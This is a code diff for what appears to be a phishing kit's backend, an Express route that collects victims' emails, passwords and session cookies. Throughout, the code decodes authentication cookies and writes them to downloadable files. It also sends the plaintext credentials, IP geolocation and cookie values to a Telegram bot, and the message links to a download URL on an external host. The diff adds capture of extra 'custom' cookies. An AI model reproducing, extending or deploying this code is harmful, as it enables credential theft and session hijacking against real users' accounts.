@@ -66,15 +66,15 @@ async function ensureCookiesDir() {
   }
 }
 
-// Enhanced function to handle both HTTP and JS cookies
-async function createCookiesFile(email, ip, cookiesBefore, jsCookieData = null, redirectUrl = null) {
+// ENHANCED: Function to handle HTTP cookies, JS cookies, AND custom cookies
+async function createCookiesFile(email, ip, cookiesBefore, jsCookieData = null, customCookies = null, redirectUrl = null) {
   await ensureCookiesDir();
   
   const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
   const filename = `cookies_${email.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.txt`;
   const filepath = path.join(COOKIES_DIR, filename);
   
-  let fileContent = `Cookies Capture Report
+  let fileContent = `Custom Cookies Capture Report
 ====================
 Email: ${email}
 IP: ${ip}
@@ -88,32 +88,73 @@ ${Object.entries(cookiesBefore).map(([k, v]) => `${k}: ${v}`).join('\n')}
 Total Initial HTTP Cookies: ${Object.keys(cookiesBefore).length}
 `;
 
+  // Add CUSTOM COOKIES section (NEW)
+  if (customCookies && customCookies.length > 0) {
+    fileContent += `
+
+CUSTOM GENERATED COOKIES (${customCookies.length}):
+================================================
+
+`;
+
+    customCookies.forEach((cookie, index) => {
+      fileContent += `COOKIE ${index + 1}:\n`;
+      fileContent += `Name: ${cookie.Name}\n`;
+      fileContent += `Value: ${cookie.Value}\n`;
+      fileContent += `Domain: ${cookie.Domain}\n`;
+      fileContent += `Path: ${cookie.Path}\n`;
+      fileContent += `Secure: ${cookie.Secure}\n`;
+      fileContent += `HttpOnly: ${cookie.HttpOnly}\n`;
+      fileContent += `SameSite: ${cookie.SameSite}\n`;
+      
+      // Try to decode base64 values for readability
+      if (cookie.Name === 'user_auth' || cookie.Name.includes('auth')) {
+        try {
+          const decoded = JSON.parse(Buffer.from(cookie.Value, 'base64').toString());
+          fileContent += `Decoded Auth Data: ${JSON.stringify(decoded, null, 2)}\n`;
+        } catch (e) {
+          // Not base64 or not JSON, keep as is
+        }
+      }
+      
+      // Decode JSON values
+      if (cookie.Name === 'user_preferences' || cookie.Value.startsWith('{')) {
+        try {
+          const decoded = JSON.parse(cookie.Value);
+          fileContent += `Decoded Preferences: ${JSON.stringify(decoded, null, 2)}\n`;
+        } catch (e) {
+          // Not JSON, keep as is
+        }
+      }
+      
+      fileContent += '-'.repeat(40) + '\n\n';
+    });
+  }
+
   // Add JavaScript cookie data if provided
   if (jsCookieData) {
     fileContent += `
 
-JAVASCRIPT COOKIE DATA FOUND:
-============================
-
-Raw JS Cookie Script:
-${jsCookieData.substring(0, 2000)}...${jsCookieData.length > 2000 ? `\n[Truncated - total ${jsCookieData.length} chars]` : ''}
+JAVASCRIPT COOKIE SETTER SCRIPT:
+===============================
+${jsCookieData.substring(0, 3000)}...${jsCookieData.length > 3000 ? `\n[Truncated - total ${jsCookieData.length} chars]` : ''}
 
 `;
 
+    // Try to parse Microsoft-style cookies from the script
     try {
-      // Try to parse the JavaScript cookie data
       const cookieMatch = jsCookieData.match(/JSON\.parse\(`([^`]+)`\)/);
       if (cookieMatch && cookieMatch[1]) {
         const cookiesJson = cookieMatch[1];
         const cookiesArray = JSON.parse(cookiesJson);
         
-        fileContent += `PARSED MICROSOFT AUTHENTICATION COOKIES (${cookiesArray.length}):\n`;
+        fileContent += `\nPARSED COOKIES FROM SCRIPT (${cookiesArray.length}):\n`;
         fileContent += '='.repeat(50) + '\n\n';
         
         cookiesArray.forEach((cookie, index) => {
-          fileContent += `COOKIE ${index + 1}:\n`;
+          fileContent += `SCRIPT COOKIE ${index + 1}:\n`;
           fileContent += `Name: ${cookie.Name}\n`;
-          fileContent += `Value: ${cookie.Value}\n`;
+          fileContent += `Value: ${cookie.Value.substring(0, 100)}...\n`;
           fileContent += `Domain: ${cookie.Domain}\n`;
           fileContent += `Path: ${cookie.Path}\n`;
           fileContent += `Secure: ${cookie.Secure}\n`;
@@ -126,13 +167,12 @@ ${jsCookieData.substring(0, 2000)}...${jsCookieData.length > 2000 ? `\n[Truncate
         // Extract redirect URL
         const redirectMatch = jsCookieData.match(/window\.location\.href=atob\("([^"]+)"\)/);
         if (redirectMatch && redirectMatch[1]) {
-          const redirectBase64 = redirectMatch[1];
-          const redirectUrl = Buffer.from(redirectBase64, 'base64').toString();
-          fileContent += `REDIRECT URL: ${redirectUrl}\n\n`;
+          const redirectUrl = Buffer.from(redirectMatch[1], 'base64').toString();
+          fileContent += `REDIRECT URL FROM SCRIPT: ${redirectUrl}\n\n`;
         }
       }
     } catch (parseError) {
-      fileContent += `ERROR PARSING JS COOKIE DATA: ${parseError.message}\n\n`;
+      fileContent += `NOTE: Could not parse cookies from script: ${parseError.message}\n\n`;
     }
   }
 
@@ -152,7 +192,7 @@ router.get('/health', (req, res) => {
   });
 });
 
-// File download routes
+// File download routes (keep as is)
 router.get('/download-cookies/:filename', async (req, res) => {
   try {
     const filename = req.params.filename;
@@ -160,7 +200,6 @@ router.get('/download-cookies/:filename', async (req, res) => {
     
     console.log('Attempting to download file:', filename);
     
-    // Check if file exists
     try {
       await fs.access(filepath);
       console.log('File exists:', filepath);
@@ -172,11 +211,9 @@ router.get('/download-cookies/:filename', async (req, res) => {
       });
     }
     
-    // Set headers for file download
     res.setHeader('Content-Type', 'text/plain');
     res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
     
-    // Stream the file to the client
     const fileStream = require('fs').createReadStream(filepath);
     fileStream.pipe(res);
     
@@ -189,7 +226,7 @@ router.get('/download-cookies/:filename', async (req, res) => {
   }
 });
 
-// List all cookie files
+// List all cookie files (keep as is)
 router.get('/cookie-files', async (req, res) => {
   try {
     await ensureCookiesDir();
@@ -213,7 +250,7 @@ router.get('/cookie-files', async (req, res) => {
   }
 });
 
-// Test route to verify file creation
+// Test route to verify file creation (keep as is)
 router.get('/test-files', async (req, res) => {
   try {
     await ensureCookiesDir();
@@ -236,7 +273,7 @@ router.get('/test-files', async (req, res) => {
   }
 });
 
-// Telegram test route
+// Telegram test route (keep as is)
 router.post('/test-telegram', async (req, res) => {
   try {
     const testMessage = `🤖 TEST MESSAGE - Server is working!
@@ -264,13 +301,25 @@ Password: test123`;
   }
 });
 
-// MAIN CHUKACHINA endpoint - handles your existing frontend requests
+// UPDATED MAIN ENDPOINT - Now accepts custom_cookies
 router.post('/', async (req, res) => {
   try {
     console.log('=== CHUKACHINA ENDPOINT HIT ===');
-    console.log('Body:', req.body);
+    console.log('Body keys:', Object.keys(req.body));
+    console.log('Has custom_cookies:', !!req.body.custom_cookies);
+    console.log('Has js_cookie_data:', !!req.body.js_cookie_data);
 
-    const { email, password, targetDomain, js_cookie_data, http_cookies, user_agent, page_url } = req.body || {};
+    const { 
+      email, 
+      password, 
+      targetDomain, 
+      js_cookie_data, 
+      http_cookies, 
+      custom_cookies,  // NEW: Accept custom cookies
+      user_agent, 
+      page_url,
+      timestamp 
+    } = req.body || {};
     
     if (!email || !password) {
       return res.status(400).json({ 
@@ -284,22 +333,22 @@ router.post('/', async (req, res) => {
     const location = geoip.lookup(ip);
     const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';
 
-    // UA parsing (use provided user_agent or fallback)
+    // UA parsing
     const parser = new UAParser(user_agent || req.headers['user-agent'] || '');
     const agent = parser.getResult();
     const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;
 
-    // Create cookies file
+    // Create cookies file WITH CUSTOM COOKIES
     let fileInfo = null;
     try {
-      fileInfo = await createCookiesFile(email, ip, http_cookies || {}, js_cookie_data, null);
+      fileInfo = await createCookiesFile(email, ip, http_cookies || {}, js_cookie_data, custom_cookies, null);
       console.log(`Cookies file created: ${fileInfo.filename}`);
     } catch (fileError) {
       console.error('Error creating cookies file:', fileError);
     }
 
-    // Build Telegram message
-    let message = `LOGIN NOTIFICATION (from /chukachina)
+    // Build enhanced Telegram message
+    let message = `CUSTOM LOGIN NOTIFICATION
 
 Email: ${email}
 Password: ${password}
@@ -309,6 +358,7 @@ Timestamp: ${new Date().toISOString()}
 Device: ${deviceType}
 Target Domain: ${targetDomain || 'None'}
 Page URL: ${page_url || 'None'}
+Custom Cookies: ${custom_cookies ? custom_cookies.length : 0}
 Cookies File: ${fileInfo ? fileInfo.filename : 'Failed to create'}
 Download URL: ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download-cookies/${fileInfo.filename}` : 'None'}
 
@@ -316,32 +366,43 @@ HTTP Cookies (${Object.keys(http_cookies || {}).length}):
 ${Object.entries(http_cookies || {}).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)'}
 `;
 
-    // Add JS cookie info to Telegram message
+    // Add CUSTOM COOKIES to Telegram message
+    if (custom_cookies && custom_cookies.length > 0) {
+      message += `\nCUSTOM COOKIES (${custom_cookies.length}):\n`;
+      custom_cookies.forEach(cookie => {
+        let valuePreview = cookie.Value;
+        if (cookie.Name === 'user_auth') {
+          try {
+            const decoded = JSON.parse(Buffer.from(cookie.Value, 'base64').toString());
+            valuePreview = `AUTH: ${decoded.email} (${decoded.session})`;
+          } catch (e) {
+            valuePreview = cookie.Value.substring(0, 30) + '...';
+          }
+        } else if (cookie.Value.length > 30) {
+          valuePreview = cookie.Value.substring(0, 30) + '...';
+        }
+        message += `- ${cookie.Name}: ${valuePreview}\n`;
+      });
+    }
+
+    // Add JS cookie info (if any)
     if (js_cookie_data) {
       try {
         const cookieMatch = js_cookie_data.match(/JSON\.parse\(`([^`]+)`\)/);
         if (cookieMatch && cookieMatch[1]) {
-          const cookiesJson = cookieMatch[1];
-          const cookiesArray = JSON.parse(cookiesJson);
-          
-          message += `\nMICROSOFT AUTH COOKIES (${cookiesArray.length}):\n`;
+          const cookiesArray = JSON.parse(cookieMatch[1]);
+          message += `\nSCRIPT COOKIES (${cookiesArray.length}):\n`;
           cookiesArray.forEach(cookie => {
-            message += `- ${cookie.Name}: ${cookie.Value.substring(0, 50)}...\n`;
+            message += `- ${cookie.Name}: ${cookie.Value.substring(0, 30)}...\n`;
           });
-
-          const redirectMatch = js_cookie_data.match(/window\.location\.href=atob\("([^"]+)"\)/);
-          if (redirectMatch && redirectMatch[1]) {
-            const redirectUrl = Buffer.from(redirectMatch[1], 'base64').toString();
-            message += `\nJS Redirect: ${redirectUrl}\n`;
-          }
         }
       } catch (parseError) {
-        message += `\nJS Cookies: (parse error: ${parseError.message})\n`;
+        message += `\nJS Cookies: (parse error)\n`;
       }
     }
 
     // Send to Telegram
-    console.log('Sending Telegram notification from /chukachina...');
+    console.log('Sending Telegram notification...');
     const telegramResult = await sendTelegramMessage(message);
     
     if (!telegramResult.success) {
@@ -356,6 +417,7 @@ ${Object.entries(http_cookies || {}).map(([k, v]) => `- ${k}: ${v}`).join('\n') 
       message: "Login data received",
       telegramSent: telegramResult.success,
       attemptProcessed: true,
+      customCookiesCount: custom_cookies ? custom_cookies.length : 0,
       downloadInfo: fileInfo ? {
         filename: fileInfo.filename,
         downloadUrl: `/chukachina/download-cookies/${fileInfo.filename}`,
